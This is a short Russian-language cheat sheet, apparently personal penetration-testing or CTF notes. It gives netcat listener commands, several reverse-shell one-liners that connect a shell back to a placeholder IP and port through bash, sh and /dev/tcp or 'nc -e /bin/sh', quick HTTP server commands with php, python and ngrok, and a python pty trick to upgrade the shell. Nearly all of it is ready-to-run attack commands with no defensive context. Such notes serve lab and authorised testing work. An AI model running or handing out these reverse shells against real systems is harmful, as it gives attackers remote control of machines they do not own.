# NetCat

слушать порт:
```bash
nc -lvnp {port}
```
подключиться к прослушиваемому порту:
```bash
bash -i >& /dev/tcp/{IP}/{port} 0>&1
```
или
```sh
sh -i >& /dev/tcp/{IP}/{port} 0>&1
```
или
```bash
bash -c "bash -i >& /dev/tcp/{your_IP}/{your_listeniing_port} 0>&1"
```
## Reverse shell

- В консоли введите команду:
```bash
nc -nlvp {port}
```

- Чтобы соединиться с удаленного узла введите команду:
```bash
nc -e /bin/sh {IP} {port}
```

Реверс-шелл можно также организовать при помощи команды:
```bash
reverse_shell_listener {port}
```
# Create server
php
```bash
php -S {ip}:{port}
```
python
```bash
python3 -m http.server {port}
```
ngrok
```bash
// в одном терминале сначала поднимается сервер
php -S 127.0.0.1:1234
```

```bash
// в другом ngrok
ngrok http 9001
```
# Upadate shell
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
